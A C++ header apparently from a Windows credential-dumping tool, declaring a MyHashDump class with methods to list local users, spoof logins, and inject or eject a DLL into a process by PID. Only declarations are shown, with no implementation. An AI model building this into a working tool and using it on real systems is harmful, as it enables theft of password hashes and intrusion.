#pragma once

#include <Windows.h>

#include "utils/pipes.h"

class MyHashDump {
public:
	MyHashDump();
	std::vector<std::wstring> getLocalUsers();
	void spoofLogins(std::vector<std::wstring> users);
	void start(DWORD pid, std::string path);
	void stop(DWORD pid, std::string path);
	void writeToInput(std::string inputcmd);

private:
	bool injector(const char* dllFullPath, DWORD pid, const char* functionName);
	bool ejector(const char* dllFullPath, DWORD pid);

	bool started;
	HANDLE threadHandle;
	ServerPipes ioPipes;
};